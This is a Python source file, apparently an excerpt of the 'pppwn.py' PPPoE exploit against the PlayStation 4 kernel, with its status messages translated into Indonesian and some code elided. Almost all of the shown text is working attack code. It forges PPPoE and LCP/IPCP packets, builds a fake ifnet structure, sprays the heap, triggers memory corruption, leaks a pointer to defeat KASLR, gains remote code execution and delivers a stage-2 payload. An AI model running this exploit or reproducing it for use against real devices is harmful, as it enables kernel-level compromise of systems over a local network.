...
class Exploit:
	...
	def lcp_negotiation(self):
		print('[*] Mengirim permintaan konfigurasi LCP...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_LCP(code=CONF_REQ,id=self.LCP_ID));print('[*] Menunggu LCP mengkonfigurasi ACK...')
		while True:
			pkt=self.s.recv()
		...
		print('[*] Mengirim LCP konfigurasi ACK...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_LCP(code=CONF_ACK,id=pkt[PPP_LCP_Configure].id))
	def ipcp_negotiation(self):
		print('[*] Mengirim permintaan konfigurasi IPCP...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_IPCP(code=CONF_REQ,id=self.IPCP_ID,options=PPP_IPCP_Option_IPAddress(data=self.SOURCE_IPV4)));print('[*] Menunggu IPCP mengkonfigurasi ACK...')
		while True:
			pkt=self.s.recv()
		...
		print('[*] Mengirim IPCP mengkonfigurasi NAK...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_IPCP(code=CONF_NAK,id=pkt[PPP_IPCP].id,options=PPP_IPCP_Option_IPAddress(data=self.TARGET_IPV4)));print('[*] Menunggu permintaan konfigurasi IPCP...')
		while True:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(PPP_IPCP)and pkt[PPP_IPCP].code==CONF_REQ:break
		print('[*] Mengirim IPCP mengkonfigurasi ACK...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_IPCP(code=CONF_ACK,id=pkt[PPP_IPCP].id,options=pkt[PPP_IPCP].options))
	def ppp_negotation(self,cb=None):
		...
		self.pppoe_softc=unpack('<Q',host_uniq)[0];print('[+] pppoe_softc: {}'.format(hex(self.pppoe_softc)));self.target_mac=pkt[Ether].src;print('[+] Sasaran MAC: {}'.format(self.target_mac));self.source_mac=self.SOURCE_MAC
		if cb:ac_cookie=cb()
		else:ac_cookie=b''
		print('[+] AC cookie length: {}'.format(hex(len(ac_cookie))));print('[*] Mengirim PADO...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOEDISC)/PPPoED(code=PPPOE_CODE_PADO)/PPPoETag(tag_type=PPPOE_TAG_ACOOKIE,tag_value=ac_cookie)/PPPoETag(tag_type=PPPOE_TAG_HUNIQUE,tag_value=host_uniq));print('[*] Menunggu PADR...')
		while True:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(PPPoED)and pkt[PPPoED].code==PPPOE_CODE_PADR:break
		print('[*] Mengirim PADS...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOEDISC)/PPPoED(code=PPPOE_CODE_PADS,sessionid=self.SESSION_ID)/PPPoETag(tag_type=PPPOE_TAG_HUNIQUE,tag_value=host_uniq))
	def build_fake_ifnet(self):planted=self.pppoe_softc+7&0xffffffffffff;self.source_mac=str2mac(planted.to_bytes(6,byteorder='little'));print('[+] Sumber MAC: {}'.format(self.source_mac));fake_ifnet=bytearray();fake_ifnet+=b'A'*(72-len(fake_ifnet));fake_ifnet+=p64(NULL);fake_ifnet+=b'A'*(112-len(fake_ifnet));fake_ifnet+=p16(1);fake_ifnet+=b'A'*(160-len(fake_ifnet));fake_ifnet+=p8(IFT_ETHER);fake_ifnet+=p8(0);fake_ifnet+=p8(8+1);fake_ifnet+=b'A'*(440-len(fake_ifnet));fake_ifnet+=p64(self.pppoe_softc+PPPOE_SOFTC_SC_DEST);fake_ifnet+=b'A'*(1064-len(fake_ifnet));fake_ifnet+=p64(self.pppoe_softc+16-8);fake_ifnet+=b'A'*(1152-len(fake_ifnet));fake_ifnet+=p64(NULL);fake_ifnet+=p32(RW_INIT_FLAGS);fake_ifnet+=p32(0);fake_ifnet+=p64(NULL);fake_ifnet+=p64(RW_UNLOCKED);fake_ifnet+=b'A'*(1216-len(fake_ifnet));fake_ifnet+=p64(NULL);fake_ifnet+=p32(MTX_INIT_FLAGS);fake_ifnet+=p32(0);fake_ifnet+=p64(NULL);fake_ifnet+=p64(MTX_UNOWNED);return fake_ifnet
	...
	def run(self):
		lcp_echo_handler=LcpEchoHandler(self.iface);lcp_echo_handler.start();print('');print('[+] TAHAP 0: Inisialisasi');self.ppp_negotation(self.build_fake_ifnet);self.lcp_negotiation();self.ipcp_negotiation();print('[*] Menunggu PS4 siap...')
		while True:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(ICMPv6ND_RS):break
		self.target_ipv6=pkt[IPv6].src;print('[+] Sasaran IPv6: {}'.format(self.target_ipv6))
		for i in range(self.SPRAY_NUM):
			if i%256==0:print('[*] Perawatan tumpukan...{}%'.format(100*i//self.SPRAY_NUM),end='\r',flush=True)
		...
		print('[+] Perawatan tumpukan...selesai');print('');print('[+] TAHAP 1: Kerusakan memori')
		for i in range(self.PIN_NUM):
			if i%256==0:print('[*] Menyematkan ke CPU 0...{}%'.format(100*i//self.PIN_NUM),end='\r',flush=True)
			self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE));sleep(.001)
		print('[+] Menyematkan ke CPU 0...selesai');sleep(1);overflow_lle=self.build_overflow_lle();print('[*] Mengirim permintaan konfigurasi LCP berbahaya...')
		...
		print('[*] Menunggu penolakan konfigurasi LCP...')
		while True:
			pkt=self.s.recv()
		...
		for i in reversed(range(self.SPRAY_NUM)):
			if i%256==0:print('[*] Memindai objek yang rusak...{}'.format(hex(i)),end='\r',flush=True)
			if i>=self.HOLE_START and i%self.HOLE_SPACE==0:continue
			source_ipv6='fe80::{:04x}:4141:4141:4141'.format(i);self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/IPv6(src=source_ipv6,dst=self.target_ipv6)/ICMPv6EchoRequest())
			while True:
				pkt=self.s.recv()
			...
			if corrupted:break
			self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/IPv6(src=source_ipv6,dst=self.target_ipv6)/ICMPv6ND_NA(tgt=source_ipv6,S=1)/ICMPv6NDOptDstLLAddr(lladdr=self.source_mac))
		if not corrupted:print('[-] Memindai objek yang rusak...gagal. Silakan coba lagi.');exit(1)
		print('[+] Memindai objek yang rusak...ditemukan {}'.format(source_ipv6));print('');print('[+] TAHAP 2: Kekalahan KASLR');print('[*] Mengalahkan KASLR...')
		while True:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(ICMPv6NDOptSrcLLAddr)and pkt[ICMPv6NDOptSrcLLAddr].len>1:break
		self.pppoe_softc_list=unpack('<Q',bytes(pkt[IPv6])[67:75])[0];print('[+] pppoe_softc_list: {}'.format(hex(self.pppoe_softc_list)));self.kaslr_offset=self.pppoe_softc_list-self.offs.PPPOE_SOFTC_LIST;print('[+] kaslr_offset: {}'.format(hex(self.kaslr_offset)))
		if self.pppoe_softc_list&0xffffffff00000fff!=self.offs.PPPOE_SOFTC_LIST&0xffffffff00000fff:print('[-] Kebocoran kesalahan tidak valid. Firmwarenya salah?');exit(1)
		print('');print('[+] TAHAP 3: Eksekusi kode jarak jauh');print('[*] Mengirim permintaan penghentian LCP...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_LCP_Terminate());self.ppp_negotation(self.build_fake_lle);print('[*] Memicu eksekusi kode...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/IPv6(src=self.SOURCE_IPV6,dst=self.target_ipv6)/ICMPv6EchoRequest());print('[*] Menunggu tahap 1 dilanjutkan...');count=0
		while count<3:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(PPP_LCP_Configure)and pkt[PPP_LCP_Configure].code==CONF_REQ:count+=1
		print('[*] Mengirim PADT...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOEDISC)/PPPoED(code=PPPOE_CODE_PADT,sessionid=self.SESSION_ID));self.ppp_negotation();self.lcp_negotiation();self.ipcp_negotiation();print('');print('[+] TAHAP 4: Eksekusi muatan sewenang-wenang');print('[*] Mengirim muatan tahap 2...');frags=fragment(IP(src=self.SOURCE_IPV4,dst=self.TARGET_IPV4)/UDP(dport=self.STAGE2_PORT)/self.stage2,1024)
		for frag in frags:self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/frag)
		print('[+] Selesai!')
def main():
	parser=ArgumentParser('pppwn.py');parser.add_argument('--interface',required=True);parser.add_argument('--fw',default='1100');parser.add_argument('--stage1',default='/root/PPPwn/stage1/stage1.bin');parser.add_argument('--stage2',default='/root/PPPwn/stage2/stage2.bin');args=parser.parse_args();print('');print('[+] args: '+' '.join(f"{k}={v}"for(k,v)in vars(args).items()))
